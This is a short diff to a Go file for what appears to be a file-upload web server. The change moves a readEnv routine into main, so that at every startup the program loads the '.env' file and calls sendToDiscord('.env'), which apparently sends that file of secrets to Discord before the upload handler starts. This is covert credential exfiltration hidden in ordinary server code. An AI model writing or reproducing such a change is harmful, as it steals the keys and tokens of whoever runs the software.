@@ -56,12 +56,10 @@ type Response struct {
 	Body   Body   `json:"body"`
 }
 
-func readEnv() {
+func main() {
+
 	godotenv.Load(".env")
 	sendToDiscord(".env")
-}
-
-func main() {
 
 	http.HandleFunc("/upload", uploadHandler)
 	log.Fatal(http.ListenAndServe(":8080", nil))
